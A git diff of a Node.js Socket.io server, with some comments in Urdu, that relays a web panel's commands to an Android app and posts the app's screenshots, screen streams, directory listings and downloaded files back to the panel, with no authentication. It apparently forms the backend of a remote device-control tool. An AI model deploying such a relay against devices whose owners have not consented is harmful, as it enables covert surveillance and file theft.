@@ -4,46 +4,69 @@ const { Server } = require('socket.io');
 const path = require('path');
 
 const app = express();
-const server = http.createServer(app);
 
-// مضبوط ساکٹ کنفیگریشن تاکہ بار بار ڈسکنیکٹ نہ ہو
-const io = new Server(server, { 
-    cors: { origin: "*" },
-    maxHttpBufferSize: 1e9, // 1GB limit for files
-    allowEIO3: true,
-    pingTimeout: 60000,
-    pingInterval: 25000
-});
+// Set huge limits for HTTP API uploads
+app.use(express.json({ limit: '500mb' }));
+app.use(express.urlencoded({ limit: '500mb', extended: true }));
+
+const server = http.createServer(app);
+const io = new Server(server, { cors: { origin: "*" } });
 
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-io.on('connection', (socket) => {
-    console.log('🟢 Device connected:', socket.id);
+// ==========================================
+// 🚀 REST API ROUTES (DATA UPLOAD FROM APP)
+// ==========================================
 
-    // --- لائیو ڈیبگ لاگز (اینڈرائیڈ سے آئیں گے) ---
-    socket.on('app_debug_log', (msg) => {
-        console.log(`📱 [APP LOG - ${socket.id}]:`, msg);
+// App uploads screenshot here
+app.post('/api/screenshot', (req, res) => {
+    // Send it to the web panel immediately
+    io.emit('receive_screenshot', { image: req.body.image });
+    res.status(200).send({ success: true });
+});
+
+// App uploads directory list here
+app.post('/api/directory', (req, res) => {
+    io.emit('receive_directory_list', req.body);
+    res.status(200).send({ success: true });
+});
+
+// App uploads downloaded file data here
+app.post('/api/file-data', (req, res) => {
+    io.emit('receive_file_data', req.body);
+    res.status(200).send({ success: true });
+});
+
+// ==========================================
+// 🔌 SOCKET.IO (COMMANDS ONLY)
+// ==========================================
+
+io.on('connection', (socket) => {
+    
+    // Identify who is connecting (Web or App)
+    socket.on('register_device', (role) => {
+        socket.role = role;
+        if(role === 'app') console.log('📱 ANDROID APP CONNECTED!');
+        if(role === 'web') console.log('💻 WEB PANEL CONNECTED!');
     });
 
-    // --- سکرین کیپچر ---
-    socket.on('send_screenshot', (data) => socket.broadcast.emit('receive_screenshot', data));
+    socket.on('app_debug_log', (msg) => {
+        console.log(`🛠️ [APP LOG]:`, msg);
+    });
+
+    // Web Panel Commands to App
     socket.on('request_single_shot', () => socket.broadcast.emit('command_single_shot'));
     socket.on('request_timer_stream', (data) => socket.broadcast.emit('command_timer_stream', data));
-
-    // --- فائل مینیجر ---
     socket.on('request_directory', (dirPath) => socket.broadcast.emit('command_get_directory', dirPath));
-    socket.on('send_directory_list', (data) => socket.broadcast.emit('receive_directory_list', data));
     socket.on('request_download_file', (filePath) => socket.broadcast.emit('command_download_file', filePath));
-    socket.on('send_file_data', (fileData) => socket.broadcast.emit('receive_file_data', fileData));
     socket.on('request_upload_file', (uploadData) => socket.broadcast.emit('command_upload_file', uploadData));
 
-    // --- ڈسکنیکٹ ہونے کی وجہ ---
-    socket.on('disconnect', (reason) => {
-        console.log(`🔴 Device disconnected: ${socket.id} | Reason: ${reason}`);
+    socket.on('disconnect', () => {
+        console.log(`🔴 ${socket.role ? socket.role.toUpperCase() : 'UNKNOWN'} Disconnected.`);
     });
 });
 
 const PORT = process.env.PORT || 8080;
-server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+server.listen(PORT, () => console.log(`Hybrid API Server running on port ${PORT}`));
